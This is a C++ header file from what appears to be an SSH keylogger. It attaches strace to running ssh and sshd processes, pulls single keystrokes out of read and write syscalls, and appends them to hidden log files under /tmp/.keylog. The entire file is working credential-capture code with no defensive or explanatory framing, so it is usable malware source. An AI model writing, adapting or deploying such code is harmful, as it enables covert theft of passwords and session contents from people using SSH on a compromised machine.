#ifndef KEYLOGGER_STRACE_HPP
#define KEYLOGGER_STRACE_HPP

#include <boost/filesystem.hpp>

namespace fs = boost::filesystem;

namespace strace_ns{
    void ssh_keylogger(const uint16_t& pid){
        std::cout << "Handling process(outgoing SSH) " << pid << std::endl;
        std::string strace_cmd= "strace -s 16384 -p " + std::to_string(pid) + " -e read 2>&1";
        FILE* pipe = popen(strace_cmd.c_str(), "r");
        if (!pipe)
        {
            std::cout << "Couldn't 'strace' command" << std::endl;
            return;
        }
        fs::path log_filename = "/tmp/.keylog";
        log_filename /= std::to_string(pid) + "_ssh.log";
        FILE *fd = std::fopen(log_filename.c_str(), "a+");
        if(!fd){
            std::cout << "Log-file error: " << log_filename << std::endl;
            return;
        }
        std::array<char, 256> buffer{};
        while(fgets(buffer.data(), 256, pipe) != nullptr){
            std::string data_from_strace{buffer.data()};
            if(data_from_strace.find("read(") != std::string::npos && data_from_strace.find(", 16384") != std::string::npos &&
               data_from_strace.find("= 1\n") != std::string::npos){
                boost::regex xRegEx("read\\(\\d+, \"(?<cmd>.*)\", 16384\\)\\s+= ");
                std::string symbol = parsing_utils::parse_strace_output(data_from_strace, xRegEx);
                std::cout << "SYMBOL: " << symbol << std::endl;
                std::fwrite(symbol.data(), 1, symbol.size(), fd);
            } else {
                continue;
            }
        }
        std::cout << "Connection is closed from PID = " << pid << std::endl;
        HandledProcesses& current_proc_list = HandledProcesses::getInstance();
        current_proc_list.del_from_proc_list(pid);
        pclose(pipe);
        std::fclose(fd);
    }

    void sshd_keylogger(const uint16_t& pid){
        std::cout << "Handling process(incoming SSH) " << pid << std::endl;
        std::string strace_cmd= "strace -s 16384 -p " + std::to_string(pid) + " -e write 2>&1";
        FILE* pipe = popen(strace_cmd.c_str(), "r");
        if (!pipe)
        {
            std::cout << "Couldn't 'strace' command" << std::endl;
            return;
        }
        fs::path log_filename = "/tmp/.keylog";
        log_filename /= std::to_string(pid) + "_sshd.log";
        FILE *fd = std::fopen(log_filename.c_str(), "a+");
        if(!fd){
            std::cout << "Log-file error: " << log_filename << std::endl;
            return;
        }
        std::array<char, 256> buffer{};
        while(fgets(buffer.data(), 256, pipe) != nullptr){
            std::string data_from_strace{buffer.data()};
            if(data_from_strace.find("write(") != std::string::npos && data_from_strace.find(", 16384") != std::string::npos &&
               data_from_strace.find("= 1\n") != std::string::npos){
                boost::regex xRegEx("write\\(\\d+, \"(?<cmd>.*)\", 16384\\)\\s+= 1");
                std::string symbol = parsing_utils::parse_strace_output(data_from_strace, xRegEx);
                std::cout << "SYMBOL: " << symbol << std::endl;
                std::fwrite(symbol.data(), 1, symbol.size(), fd);
            } else {
                continue;
            }
        }
        std::cout << "Connection is closed from PID = " << pid << std::endl;
        HandledProcesses& current_proc_list = HandledProcesses::getInstance();
        current_proc_list.del_from_proc_list(pid);
        pclose(pipe);
        std::fclose(fd);
    }
}

#endif //KEYLOGGER_STRACE_HPP
